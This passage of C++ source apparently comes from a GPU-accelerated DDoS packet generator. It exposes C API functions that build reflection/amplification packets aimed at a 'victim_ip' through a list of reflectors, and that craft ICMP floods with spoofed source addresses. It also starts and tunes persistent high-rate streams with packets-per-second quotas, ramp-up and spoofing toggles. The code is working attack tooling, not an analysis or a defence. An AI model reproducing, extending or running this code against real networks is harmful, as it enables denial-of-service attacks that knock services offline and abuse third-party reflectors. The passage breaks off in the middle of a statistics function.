extern "C" int samurai_gpu_packet_generate_amplification_packets(
    const uint8_t* template_bytes,
    size_t template_len,
    const char* const* reflectors_ips,
    size_t reflectors_count,
    const char* victim_ip,
    int64_t count,
    int has_ethernet,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }
    if (!template_bytes || template_len == 0) {
      return set_c_api_error("template_bytes must not be empty");
    }
    if (!reflectors_ips && reflectors_count > 0) {
      return set_c_api_error("reflectors_ips pointer is null");
    }
    const std::string victim = victim_ip ? std::string(victim_ip) : std::string();
    if (victim.empty()) {
      return set_c_api_error("victim_ip must not be empty");
    }

    std::vector<uint8_t> tpl(template_bytes, template_bytes + template_len);
    cudaStream_t stream = decode_stream_handle(stream_handle);
    std::vector<std::string> reflectors;
    reflectors.reserve(reflectors_count);
    for (size_t i = 0; i < reflectors_count; ++i) {
      if (!reflectors_ips[i]) {
        return set_c_api_error("reflectors_ips contains null entry");
      }
      reflectors.emplace_back(reflectors_ips[i]);
    }

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_amplification_packets(
            tpl,
            reflectors,
            victim,
            count,
            has_ethernet != 0,
            stream,
            gateway_mac);

    return export_packet_result(
        res, "c_api_generate_amplification", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_generate_icmp_packets(
    int64_t count,
    const char* target_ip,
    const char* real_src_ip,
    int spoof_ip,
    int has_ethernet,
    int64_t icmp_type,
    int64_t icmp_code,
    int64_t payload_size,
    uint64_t stream_handle,
    uint64_t gateway_mac,
    const char* spoof_subnet,
    uint8_t** out_data,
    size_t* out_size,
    int* out_packet_size) {
  try {
    if (init_c_api_outputs(out_data, out_size, out_packet_size) != 0) {
      return -1;
    }
    if (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent)) {
      g_compat_fallback_count.fetch_add(1u, std::memory_order_relaxed);
    }
    const std::string target = target_ip ? std::string(target_ip) : std::string();
    if (target.empty()) {
      return set_c_api_error("target_ip must not be empty");
    }
    const std::string src = real_src_ip ? std::string(real_src_ip) : std::string("192.168.1.100");
    const std::string subnet = spoof_subnet ? std::string(spoof_subnet) : std::string("1.0.0.0/8");
    cudaStream_t stream = decode_stream_handle(stream_handle);

    ddos_samurai::gpu_packet_cuda::PacketResult res =
        ddos_samurai::gpu_packet_cuda::generate_icmp_packets(
            count,
            target,
            src,
            spoof_ip != 0,
            has_ethernet != 0,
            icmp_type,
            icmp_code,
            payload_size,
            stream,
            gateway_mac,
            subnet);

    return export_packet_result(
        res, "c_api_generate_icmp", stream, out_data, out_size, out_packet_size);
  } catch (const std::exception& e) {
    return set_c_api_error(e.what());
  } catch (...) {
    return set_c_api_error("unknown error");
  }
}

extern "C" int samurai_gpu_packet_publication_budget_us(uint32_t rtt_us, uint32_t* out_budget_us) {
  if (!out_budget_us) {
    return set_c_api_error("out_budget_us must not be null");
  }
  *out_budget_us = ddos_samurai::gpu_packet_cuda::zero_copy::publication_budget_us(rtt_us);
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_seqlock_next_versions(
    uint64_t current_version,
    uint64_t* out_write_begin,
    uint64_t* out_write_commit) {
  if (!out_write_begin || !out_write_commit) {
    return set_c_api_error("out_write_begin and out_write_commit must not be null");
  }
  ddos_samurai::gpu_packet_cuda::zero_copy::next_seqlock_versions(
      current_version, out_write_begin, out_write_commit);
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_descriptor_transition_valid(
    int32_t from_state,
    int32_t to_state,
    int32_t* out_valid) {
  if (!out_valid) {
    return set_c_api_error("out_valid must not be null");
  }
  using ddos_samurai::gpu_packet_cuda::zero_copy::DescriptorOwnershipState;
  if (from_state < static_cast<int32_t>(DescriptorOwnershipState::kFree) ||
      from_state > static_cast<int32_t>(DescriptorOwnershipState::kComplete) ||
      to_state < static_cast<int32_t>(DescriptorOwnershipState::kFree) ||
      to_state > static_cast<int32_t>(DescriptorOwnershipState::kComplete)) {
    return set_c_api_error("descriptor state value is out of range");
  }
  const auto from = static_cast<DescriptorOwnershipState>(from_state);
  const auto to = static_cast<DescriptorOwnershipState>(to_state);
  *out_valid = ddos_samurai::gpu_packet_cuda::zero_copy::is_valid_descriptor_transition(from, to) ? 1 : 0;
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_compute_flow_affinity_v1(
    int32_t block_idx,
    int32_t block_dim,
    int32_t thread_idx,
    int32_t flows_per_warp,
    int32_t warp_size,
    samurai_gpu_packet_flow_affinity_v1* out) {
  if (!out) {
    return set_c_api_error("out must not be null");
  }
  const auto aff = ddos_samurai::gpu_packet_cuda::zero_copy::compute_flow_affinity(
      block_idx, block_dim, thread_idx, flows_per_warp, warp_size);
  out->global_tid = aff.global_tid;
  out->global_warp_id = aff.global_warp_id;
  out->lane = aff.lane;
  out->flow_start = aff.flow_start;
  out->flow_id = aff.flow_id;
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_contract_publish_flow_update_v1(
    const samurai_gpu_packet_flow_update_event_v1* event) {
  if (!event) {
    return set_c_api_error("event must not be null");
  }
  std::lock_guard<std::mutex> g(g_persistent_lock);
  if (!persistent_runtime_ensure_started_unlocked()) {
    return set_c_api_error("persistent runtime is not available");
  }
  PersistentRuntime& rt = g_persistent_runtime;
  if (!persistent_contract_runtime_ensure_started_unlocked(rt)) {
    return set_c_api_error("contract runtime is not available");
  }
  auto& cr = g_persistent_contract_runtime;
  const uint32_t flow_id = event->flow_id;
  if ((event->version & 1ull) != 0ull) {
    return set_c_api_error("flow update version must be committed/even");
  }
  if (flow_id >= static_cast<uint32_t>(cr.hot_flow_capacity)) {
    return set_c_api_error("flow_id exceeds contract hot-flow capacity");
  }
  if (cr.shard_count <= 0 || cr.ring_slots_per_shard <= 0 || cr.update_ring.empty()) {
    return set_c_api_error("contract ring is not initialized");
  }

  ddos_samurai::gpu_packet_cuda::zero_copy::FlowUpdateEventV1 ev{};
  ev.version = event->version;
  ev.epoch = event->epoch;
  ev.flow_id = event->flow_id;
  ev.tcp_seq = event->tcp_seq;
  ev.tcp_ack = event->tcp_ack;
  ev.src_port = event->src_port;
  ev.dst_port = event->dst_port;
  ev.tcp_state = event->tcp_state;
  ev.proto = event->proto;
  ev.flags = event->flags;
  ev.rtt_us = event->rtt_us;
  ev.dpu_ts_ns = event->dpu_ts_ns;

  const uint64_t prev_epoch = cr.hot_flow_epochs[static_cast<size_t>(flow_id)];
  if (prev_epoch != 0u && ev.epoch < prev_epoch) {
    cr.epoch_mismatch_count += 1u;
    return set_c_api_error("contract epoch mismatch: stale flow update");
  }

  const int shard = static_cast<int>(flow_id % static_cast<uint32_t>(cr.shard_count));
  if (!persistent_contract_runtime_refresh_device_tail_unlocked(cr, static_cast<size_t>(shard))) {
    return set_c_api_error("failed to refresh contract device tail");
  }
  uint64_t& head = cr.ring_head[static_cast<size_t>(shard)];
  uint64_t& tail = cr.ring_tail[static_cast<size_t>(shard)];
  const uint64_t used = (head >= tail) ? (head - tail) : 0u;
  const uint64_t cap = static_cast<uint64_t>(cr.ring_slots_per_shard);
  if (used >= cap) {
    cr.drop_count += 1u;
    cr.ring_drop_by_shard[static_cast<size_t>(shard)] += 1u;
    if (rt.ctrl) {
      rt.ctrl->ring_drop_events += 1u;
    }
    if (cr.overflow_policy == ddos_samurai::gpu_packet_cuda::zero_copy::RingOverflowPolicy::kHardFail) {
      return set_c_api_error("contract ring overflow (hard fail)");
    }
    tail += 1u;
    if (!persistent_contract_runtime_sync_device_tail_unlocked(cr, static_cast<size_t>(shard))) {
      return set_c_api_error("failed to sync contract controlled-drop tail");
    }
  }

  const size_t shard_base = static_cast<size_t>(shard) * static_cast<size_t>(cr.ring_slots_per_shard);
  const size_t slot = static_cast<size_t>(head % cap);
  const size_t ring_index = shard_base + slot;
  cr.update_ring[ring_index] = ev;
  head += 1u;

  const uint64_t prev_version = cr.hot_flow_versions[static_cast<size_t>(flow_id)];
  if (prev_version != 0u && ev.version > (prev_version + 2u)) {
    cr.version_gap_count += 1u;
  }
  cr.hot_flow_table[static_cast<size_t>(flow_id)] = ev;
  cr.hot_flow_versions[static_cast<size_t>(flow_id)] = ev.version;
  cr.hot_flow_epochs[static_cast<size_t>(flow_id)] = ev.epoch;
  cr.publish_count += 1u;
  if (!persistent_contract_runtime_sync_device_slot_unlocked(
          cr,
          ring_index,
          static_cast<size_t>(shard),
          static_cast<size_t>(flow_id))) {
    return set_c_api_error("failed to sync contract update into device mirror");
  }

  if (flow_id < static_cast<uint32_t>(kPersistentMaxStreams) && rt.streams && rt.streams_dev && rt.streams_hot_dev) {
    const int slot_id = static_cast<int>(flow_id);
    PersistentDeviceStreamState& d = rt.streams[static_cast<size_t>(slot_id)];
    if (d.active != 0) {
      if (ev.proto == 1u || ev.proto == 6u || ev.proto == 17u) {
        d.protocol = static_cast<int32_t>(ev.proto);
      }
      if (ev.dst_port != 0u && d.protocol != 1) {
        d.target_port = ev.dst_port;
      }
      if (ev.src_port != 0u) {
        d.source_port = ev.src_port;
        d.source_port_mode = 1u;
      }
      if (ev.flags != 0u) {
        d.tcp_flags = ev.flags;
      }
      d.seq_counter = ev.tcp_seq;
      persistent_build_stream_template(&d);
      if (!persistent_stream_copy_slot_to_device(rt, slot_id)) {
        return set_c_api_error("failed to sync flow update into stream state");
      }
      if (!persistent_sync_hot_stream_slot(rt, slot_id)) {
        return set_c_api_error("failed to sync flow update into hot stream table");
      }
    }
  }
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_contract_read_hot_flow_v1(
    uint32_t flow_id,
    samurai_gpu_packet_flow_update_event_v1* out_event) {
  if (!out_event) {
    return set_c_api_error("out_event must not be null");
  }
  std::lock_guard<std::mutex> g(g_persistent_lock);
  if (!persistent_runtime_ensure_started_unlocked()) {
    return set_c_api_error("persistent runtime is not available");
  }
  PersistentRuntime& rt = g_persistent_runtime;
  if (!persistent_contract_runtime_ensure_started_unlocked(rt)) {
    return set_c_api_error("contract runtime is not available");
  }
  auto& cr = g_persistent_contract_runtime;
  if (flow_id >= static_cast<uint32_t>(cr.hot_flow_capacity)) {
    return set_c_api_error("flow_id exceeds contract hot-flow capacity");
  }
  const auto& ev = cr.hot_flow_table[static_cast<size_t>(flow_id)];
  out_event->version = ev.version;
  out_event->epoch = ev.epoch;
  out_event->flow_id = ev.flow_id;
  out_event->tcp_seq = ev.tcp_seq;
  out_event->tcp_ack = ev.tcp_ack;
  out_event->src_port = ev.src_port;
  out_event->dst_port = ev.dst_port;
  out_event->tcp_state = ev.tcp_state;
  out_event->proto = ev.proto;
  out_event->flags = ev.flags;
  out_event->rtt_us = ev.rtt_us;
  out_event->dpu_ts_ns = ev.dpu_ts_ns;
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_set_kernel_mode(int mode) {
  if (mode != static_cast<int>(KernelMode::kBatch) &&
      mode != static_cast<int>(KernelMode::kPersistent)) {
    return set_c_api_error("kernel mode must be 0(batch) or 1(persistent)");
  }
  g_kernel_mode.store(mode, std::memory_order_relaxed);
  if (mode == static_cast<int>(KernelMode::kBatch)) {
    persistent_runtime_release_unlocked();
  } else {
    std::lock_guard<std::mutex> g(g_persistent_lock);
    if (!persistent_runtime_ensure_started_unlocked()) {
      return set_c_api_error("persistent runtime initialization failed");
    }
  }
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_get_kernel_mode() {
  return g_kernel_mode.load(std::memory_order_relaxed);
}

extern "C" int samurai_gpu_packet_start_stream(const char* profile_json, int64_t* out_stream_id) {
  if (!out_stream_id) {
    return set_c_api_error("out_stream_id must not be null");
  }
  if (g_kernel_mode.load(std::memory_order_relaxed) != static_cast<int>(KernelMode::kPersistent)) {
    return set_c_api_error("start_stream requires kernel_mode=persistent");
  }
  std::lock_guard<std::mutex> g(g_persistent_lock);
  if (!persistent_runtime_ensure_started_unlocked()) {
    return set_c_api_error("persistent runtime is not available");
  }

  int free_slot = -1;
  for (int i = 0; i < kPersistentMaxStreams; ++i) {
    if (g_persistent_runtime.streams[i].active == 0) {
      free_slot = i;
      break;
    }
  }
  if (free_slot < 0) {
    return set_c_api_error("persistent stream capacity exceeded");
  }

  const std::string profile = profile_json ? std::string(profile_json) : std::string();
  const int64_t stream_id = g_next_stream_id.fetch_add(1, std::memory_order_relaxed);
  PersistentStreamState st;
  st.id = stream_id;
  st.profile_json = profile;
  st.update_json.clear();
  st.device_slot = free_slot;
  st.created_ns = now_ns_steady();
  st.updated_ns = st.created_ns;
  st.heartbeat_ns = st.created_ns;
  st.progress_ns = st.created_ns;
  st.protocol = protocol_from_string(json_get_string(profile, "protocol", "tcp"), 6);
  st.stream_type = lower_copy(json_get_string(profile, "stream_type", (st.protocol == 1 ? "icmp" : "l4")));
  st.stream_kind = static_cast<int>(stream_kind_from_string(st.stream_type, st.protocol));
  st.target_ip_int = json_get_ip(profile, "target_ip", 0u);
  st.src_ip_int = json_get_ip(
      profile,
      "real_src_ip",
      ddos_samurai::gpu_packet_cuda::ip_to_int("192.168.1.100"));
  st.target_port = (st.protocol == 1)
      ? static_cast<uint16_t>(0)
      : static_cast<uint16_t>(clamp_i(json_get_int(profile, "target_port", 0), 0, 65535));
  st.queue_affinity = json_get_int(profile, "queue_affinity", -1);
  st.source_port = static_cast<uint16_t>(clamp_i(json_get_int(profile, "source_port", 0), 0, 65535));
  st.source_port_mode = static_cast<uint8_t>(
      clamp_i(json_get_int(profile, "source_port_mode", (st.source_port > 0 ? 1 : 0)), 0, 1));
  st.tcp_flags = static_cast<uint16_t>(clamp_i(json_get_int(profile, "tcp_flags", 0x02), 0, 255));
  st.tcp_window = static_cast<uint16_t>(clamp_i(json_get_int(profile, "window", 65535), 0, 65535));
  st.icmp_type = clamp_i(json_get_int(profile, "icmp_type", 8), 0, 255);
  st.icmp_code = clamp_i(json_get_int(profile, "icmp_code", 0), 0, 255);
  st.pcap_file = json_get_string(profile, "pcap_file", std::string());
  st.payload_byte = static_cast<uint8_t>(clamp_i(json_get_int(profile, "payload_byte", 0), 0, 255));
  st.payload_len = static_cast<uint16_t>(clamp_i(json_get_int(profile, "payload_len", 0), 0, kPersistentPayloadCapacity));
  const std::vector<uint8_t> payload_hex = parse_hex_payload(json_get_string(profile, "payload_hex", std::string()));
  if (!payload_hex.empty()) {
    st.payload_len = static_cast<uint16_t>(
        std::min<size_t>(payload_hex.size(), static_cast<size_t>(kPersistentPayloadCapacity)));
  }
  {
    std::array<uint8_t, 6> src_mac{};
    std::array<uint8_t, 6> dst_mac{};
    const bool src_ok = parse_mac_string(json_get_string(profile, "src_mac", std::string()), src_mac);
    const bool dst_ok = parse_mac_string(json_get_string(profile, "dst_mac", std::string()), dst_mac);
    const bool force_custom = json_get_bool(profile, "has_custom_mac", false);
    if (force_custom || (src_ok && dst_ok)) {
      st.has_custom_mac = static_cast<uint8_t>(src_ok && dst_ok ? 1 : 0);
      if (src_ok) st.src_mac = src_mac;
      if (dst_ok) st.dst_mac = dst_mac;
    }
  }
  st.quota = static_cast<uint32_t>(std::max(0, json_get_int(profile, "quota", 0)));
  st.base_quota = st.quota;
  st.quota_left = st.quota;
  st.ramp_step = static_cast<uint32_t>(std::max(0, json_get_int(profile, "ramp_step", 0)));
  st.ramp_interval_epochs = static_cast<uint32_t>(std::max(0, json_get_int(profile, "ramp_interval_epochs", 1)));
  st.ramp_max_quota = static_cast<uint32_t>(std::max(0, json_get_int(profile, "ramp_max_quota", 0)));
  st.ramp_epoch_counter = 0u;
  st.tx_base_timestamp_ns = json_get_u64(
      profile,
      "tx_base_timestamp_ns",
      json_get_u64(profile, "base_tx_timestamp_ns", 0u));
  st.tx_ipg_ns = static_cast<uint32_t>(std::min<uint64_t>(
      json_get_u64(
          profile,
          "tx_ipg_ns",
          json_get_u64(profile, "base_ipg_ns", json_get_u64(profile, "inter_flow_gap_ns", 0u))),
      static_cast<uint64_t>(std::numeric_limits<uint32_t>::max())));
  st.active = 1;

  PersistentDeviceStreamState& d = g_persistent_runtime.streams[free_slot];
  std::memset(&d, 0, sizeof(d));
  g_persistent_runtime.completed_by_slot[static_cast<size_t>(free_slot)].store(0u, std::memory_order_relaxed);
  d.active = 1;
  d.stream_id = static_cast<int32_t>(stream_id);
  d.stream_kind = st.stream_kind;
  d.protocol = st.protocol;
  d.has_ethernet = clamp_i(json_get_int(profile, "has_ethernet", 1), 0, 1);
  d.spoof_enabled = clamp_i(json_get_int(profile, "spoof_ip", 0), 0, 1);
  d.queue_affinity = st.queue_affinity;
  d.target_ip = st.target_ip_int;
  d.src_ip = st.src_ip_int;
  d.target_port = st.target_port;
  d.source_port = st.source_port;
  d.source_port_mode = st.source_port_mode;
  d.tcp_flags = st.tcp_flags;
  d.tcp_window = st.tcp_window;
  d.icmp_type = st.icmp_type;
  d.icmp_code = st.icmp_code;
  d.payload_len = st.payload_len;
  d.payload_byte = st.payload_byte;
  d.has_custom_mac = st.has_custom_mac;
  for (int i = 0; i < 6; ++i) {
    d.src_mac[i] = st.src_mac[static_cast<size_t>(i)];
    d.dst_mac[i] = st.dst_mac[static_cast<size_t>(i)];
  }
  for (int i = 0; i < static_cast<int>(d.payload_len) && i < kPersistentPayloadCapacity; ++i) {
    d.payload[i] = st.payload_byte;
  }
  if (!payload_hex.empty()) {
    d.payload_len = static_cast<uint16_t>(
        std::min<size_t>(payload_hex.size(), static_cast<size_t>(kPersistentPayloadCapacity)));
    st.payload_len = d.payload_len;
    for (size_t i = 0; i < static_cast<size_t>(d.payload_len); ++i) {
      d.payload[i] = payload_hex[i];
    }
  }
  d.quota = st.quota;
  d.quota_left = st.quota_left;
  d.ramp_step = st.ramp_step;
  d.ramp_interval_epochs = st.ramp_interval_epochs;
  d.ramp_max_quota = st.ramp_max_quota;
  d.ramp_epoch_counter = st.ramp_epoch_counter;
  d.tx_base_timestamp_ns = st.tx_base_timestamp_ns;
  d.tx_ipg_ns = st.tx_ipg_ns;
  d.weight = static_cast<uint32_t>(std::max(1, clamp_i(json_get_int(profile, "weight", 1), 1, 32)));
  d.deficit = d.weight;

  const std::string spoof_subnet = json_get_string(profile, "spoof_subnet", "1.0.0.0/8");
  auto [spoof_base, spoof_mask] = ddos_samurai::gpu_packet_cuda::parse_subnet(spoof_subnet);
  d.spoof_base_ip = spoof_base;
  d.spoof_mask = spoof_mask;
  st.spoof_base_ip = spoof_base;
  st.spoof_mask = spoof_mask;
  persistent_build_stream_template(&d);
  if (!persistent_stream_copy_slot_to_device(g_persistent_runtime, free_slot)) {
    std::memset(&d, 0, sizeof(d));
    return set_c_api_error("failed to sync stream device state");
  }
  if (!persistent_sync_hot_stream_slot(g_persistent_runtime, free_slot)) {
    std::memset(&d, 0, sizeof(d));
    return set_c_api_error("failed to sync stream hot mirror");
  }

  g_persistent_streams[stream_id] = std::move(st);
  persistent_sync_active_stream_count_unlocked(g_persistent_runtime);
  *out_stream_id = stream_id;
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_update_stream(int64_t stream_id, const char* update_json) {
  std::lock_guard<std::mutex> g(g_persistent_lock);
  auto it = g_persistent_streams.find(stream_id);
  if (it == g_persistent_streams.end()) {
    return set_c_api_error("stream_id not found");
  }
  if (!persistent_runtime_ensure_started_unlocked()) {
    return set_c_api_error("persistent runtime is not available");
  }
  auto& st = it->second;
  st.update_json = update_json ? std::string(update_json) : std::string();
  st.updated_ns = now_ns_steady();
  st.heartbeat_ns = st.updated_ns;
  if (st.device_slot < 0 || st.device_slot >= kPersistentMaxStreams) {
    return set_c_api_error("stream has invalid device slot");
  }
  PersistentDeviceStreamState& d = g_persistent_runtime.streams[st.device_slot];
  if (!persistent_stream_copy_slot_to_host(g_persistent_runtime, st.device_slot)) {
    return set_c_api_error("failed to refresh stream device state");
  }
  if (d.active == 0) {
    return set_c_api_error("stream runtime slot is inactive");
  }

  const int quota_i = json_get_int(st.update_json, "quota", -1);
  if (quota_i >= 0) {
    st.base_quota = static_cast<uint32_t>(quota_i);
    st.quota = st.base_quota;
    d.quota = st.quota;
    d.quota_left = st.quota;
  }
  const int queue_i = json_get_int(st.update_json, "queue_affinity", st.queue_affinity);
  st.queue_affinity = queue_i;
  d.queue_affinity = queue_i;
  d.has_ethernet = clamp_i(json_get_int(st.update_json, "has_ethernet", d.has_ethernet), 0, 1);
  d.spoof_enabled = clamp_i(json_get_int(st.update_json, "spoof_ip", d.spoof_enabled), 0, 1);
  st.target_ip_int = json_get_ip(st.update_json, "target_ip", st.target_ip_int);
  st.src_ip_int = json_get_ip(st.update_json, "real_src_ip", st.src_ip_int);
  d.target_ip = st.target_ip_int;
  d.src_ip = st.src_ip_int;

  const int pps_i = json_get_int(st.update_json, "pps", -1);
  if (pps_i > 0 && st.base_quota == 0) {
    st.base_quota = static_cast<uint32_t>(pps_i);
    st.quota = st.base_quota;
    d.quota = st.quota;
    d.quota_left = std::max<uint32_t>(d.quota_left, d.quota);
  }
  const int weight_i = json_get_int(st.update_json, "weight", static_cast<int>(d.weight));
  d.weight = static_cast<uint32_t>(std::max(1, clamp_i(weight_i, 1, 32)));
  if (d.deficit == 0) {
    d.deficit = d.weight;
  }
  const std::string proto_s = json_get_string(st.update_json, "protocol", std::string(protocol_name_from_int(st.protocol)));
  st.protocol = protocol_from_string(proto_s, st.protocol);
  d.protocol = st.protocol;
  const int port_i = json_get_int(st.update_json, "target_port", static_cast<int>(st.target_port));
  st.target_port = (st.protocol == 1) ? static_cast<uint16_t>(0) : static_cast<uint16_t>(clamp_i(port_i, 0, 65535));
  d.target_port = st.target_port;
  st.source_port = static_cast<uint16_t>(clamp_i(
      json_get_int(st.update_json, "source_port", static_cast<int>(st.source_port)), 0, 65535));
  st.source_port_mode = static_cast<uint8_t>(clamp_i(
      json_get_int(st.update_json, "source_port_mode", static_cast<int>(st.source_port_mode)), 0, 1));
  d.source_port = st.source_port;
  d.source_port_mode = st.source_port_mode;

  st.stream_type = lower_copy(json_get_string(st.update_json, "stream_type", st.stream_type));
  st.stream_kind = static_cast<int>(stream_kind_from_string(st.stream_type, st.protocol));
  d.stream_kind = st.stream_kind;
  st.tcp_flags = static_cast<uint16_t>(clamp_i(
      json_get_int(st.update_json, "tcp_flags", static_cast<int>(st.tcp_flags)), 0, 255));
  st.tcp_window = static_cast<uint16_t>(clamp_i(
      json_get_int(st.update_json, "window", static_cast<int>(st.tcp_window)), 0, 65535));
  d.tcp_flags = st.tcp_flags;
  d.tcp_window = st.tcp_window;
  st.icmp_type = clamp_i(json_get_int(st.update_json, "icmp_type", st.icmp_type), 0, 255);
  st.icmp_code = clamp_i(json_get_int(st.update_json, "icmp_code", st.icmp_code), 0, 255);
  d.icmp_type = st.icmp_type;
  d.icmp_code = st.icmp_code;
  st.payload_byte = static_cast<uint8_t>(clamp_i(
      json_get_int(st.update_json, "payload_byte", static_cast<int>(st.payload_byte)), 0, 255));
  st.payload_len = static_cast<uint16_t>(clamp_i(
      json_get_int(st.update_json, "payload_len", static_cast<int>(st.payload_len)),
      0,
      kPersistentPayloadCapacity));
  d.payload_byte = st.payload_byte;
  d.payload_len = st.payload_len;
  for (int i = 0; i < static_cast<int>(d.payload_len) && i < kPersistentPayloadCapacity; ++i) {
    d.payload[i] = d.payload_byte;
  }
  {
    const std::vector<uint8_t> payload_hex =
        parse_hex_payload(json_get_string(st.update_json, "payload_hex", std::string()));
    if (!payload_hex.empty()) {
      d.payload_len = static_cast<uint16_t>(
          std::min<size_t>(payload_hex.size(), static_cast<size_t>(kPersistentPayloadCapacity)));
      st.payload_len = d.payload_len;
      for (size_t i = 0; i < static_cast<size_t>(d.payload_len); ++i) {
        d.payload[i] = payload_hex[i];
      }
    }
  }
  {
    std::array<uint8_t, 6> src_mac{};
    std::array<uint8_t, 6> dst_mac{};
    const bool src_ok = parse_mac_string(json_get_string(st.update_json, "src_mac", std::string()), src_mac);
    const bool dst_ok = parse_mac_string(json_get_string(st.update_json, "dst_mac", std::string()), dst_mac);
    const bool force_custom = json_get_bool(st.update_json, "has_custom_mac", static_cast<bool>(st.has_custom_mac));
    if (src_ok) {
      st.src_mac = src_mac;
    }
    if (dst_ok) {
      st.dst_mac = dst_mac;
    }
    if (force_custom) {
      if (src_ok && dst_ok) {
        st.has_custom_mac = 1;
      } else if (src_ok != dst_ok) {
        st.has_custom_mac = 0;
      }
    } else if (src_ok && dst_ok) {
      st.has_custom_mac = 1;
    }
    d.has_custom_mac = st.has_custom_mac;
    for (int i = 0; i < 6; ++i) {
      d.src_mac[i] = st.src_mac[static_cast<size_t>(i)];
      d.dst_mac[i] = st.dst_mac[static_cast<size_t>(i)];
    }
  }
  st.ramp_step = static_cast<uint32_t>(std::max(0, json_get_int(st.update_json, "ramp_step", static_cast<int>(st.ramp_step))));
  st.ramp_interval_epochs = static_cast<uint32_t>(
      std::max(0, json_get_int(st.update_json, "ramp_interval_epochs", static_cast<int>(st.ramp_interval_epochs))));
  st.ramp_max_quota = static_cast<uint32_t>(
      std::max(0, json_get_int(st.update_json, "ramp_max_quota", static_cast<int>(st.ramp_max_quota))));
  d.ramp_step = st.ramp_step;
  d.ramp_interval_epochs = st.ramp_interval_epochs;
  d.ramp_max_quota = st.ramp_max_quota;
  {
    const std::string base_raw = json_value_raw(st.update_json, "tx_base_timestamp_ns");
    const std::string base_alias_raw = json_value_raw(st.update_json, "base_tx_timestamp_ns");
    if (!base_raw.empty() || !base_alias_raw.empty()) {
      st.tx_base_timestamp_ns = json_get_u64(
          st.update_json,
          "tx_base_timestamp_ns",
          json_get_u64(st.update_json, "base_tx_timestamp_ns", st.tx_base_timestamp_ns));
    }
  }
  {
    const std::string ipg_raw = json_value_raw(st.update_json, "tx_ipg_ns");
    const std::string ipg_base_raw = json_value_raw(st.update_json, "base_ipg_ns");
    const std::string ifg_raw = json_value_raw(st.update_json, "inter_flow_gap_ns");
    if (!ipg_raw.empty() || !ipg_base_raw.empty() || !ifg_raw.empty()) {
      const uint64_t ipg_u64 = json_get_u64(
          st.update_json,
          "tx_ipg_ns",
          json_get_u64(
              st.update_json,
              "base_ipg_ns",
              json_get_u64(st.update_json, "inter_flow_gap_ns", static_cast<uint64_t>(st.tx_ipg_ns))));
      st.tx_ipg_ns = static_cast<uint32_t>(std::min<uint64_t>(
          ipg_u64,
          static_cast<uint64_t>(std::numeric_limits<uint32_t>::max())));
    }
  }
  d.tx_base_timestamp_ns = st.tx_base_timestamp_ns;
  d.tx_ipg_ns = st.tx_ipg_ns;
  if (st.stream_kind != static_cast<int>(PersistentStreamKind::kRamp)) {
    st.ramp_epoch_counter = 0u;
    d.ramp_epoch_counter = 0u;
  }
  st.pcap_file = json_get_string(st.update_json, "pcap_file", st.pcap_file);
  persistent_build_stream_template(&d);
  if (!persistent_stream_copy_slot_to_device(g_persistent_runtime, st.device_slot)) {
    return set_c_api_error("failed to sync stream device state");
  }
  if (!persistent_sync_hot_stream_slot(g_persistent_runtime, st.device_slot)) {
    return set_c_api_error("failed to sync stream hot mirror");
  }
  persistent_sync_active_stream_count_unlocked(g_persistent_runtime);

  st.submitted = d.produced;
  st.quota_left = d.quota_left;
  st.progress_ns = now_ns_steady();
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" int samurai_gpu_packet_stop_stream(int64_t stream_id) {
  std::lock_guard<std::mutex> g(g_persistent_lock);
  auto it = g_persistent_streams.find(stream_id);
  if (it == g_persistent_streams.end()) {
    return set_c_api_error("stream_id not found");
  }
  if (it->second.device_slot >= 0 && it->second.device_slot < kPersistentMaxStreams && g_persistent_runtime.streams) {
    std::memset(&g_persistent_runtime.streams[it->second.device_slot], 0, sizeof(PersistentDeviceStreamState));
    (void)persistent_stream_copy_slot_to_device(g_persistent_runtime, it->second.device_slot);
    (void)persistent_sync_hot_stream_slot(g_persistent_runtime, it->second.device_slot);
    g_persistent_runtime.completed_by_slot[static_cast<size_t>(it->second.device_slot)].store(
        0u, std::memory_order_relaxed);
  }
  it->second.active = 0;
  g_persistent_streams.erase(it);
  persistent_sync_active_stream_count_unlocked(g_persistent_runtime);
  g_samurai_gpu_packet_last_error.clear();
  return 0;
}

extern "C" const char* samurai_gpu_packet_read_stream_stats(int64_t stream_id) {
  std::lock_guard<std::mutex> g(g_persistent_lock);
  if (stream_id == 0) {
    std::ostringstream oss;
    const bool rt_active = (g_persistent_runtime.ctrl != nullptr);
    oss << "{"
        << "\"kernel_mode\":" << g_kernel_mode.load(std::memory_order_relaxed) << ","
        << "\"gpu_kernel_mode_active\":"
        << (g_kernel_mode.load(std::memory_order_relaxed) == static_cast<int>(KernelMode::kPersistent) ? 1 : 0)
        << ","
        << "\"stream_count\":" << g_persistent_streams.size() << ","
        << "\"active_streams\":" << (rt_active ? g_persistent_runtime.ctrl->active_streams : 0) << ","
        << "\"runtime_active\":" << (rt_active ? 1 : 0) << ","
        << "\"persistent_runtime_restarts\":"
        << (rt_active ? g_persistent_runtime.ctrl->runtime_restarts : 0u) << ","
        << "\"no_progress_events\":" << (rt_active ? g_persistent_runtime.ctrl->no_progress_events : 0u) << ","
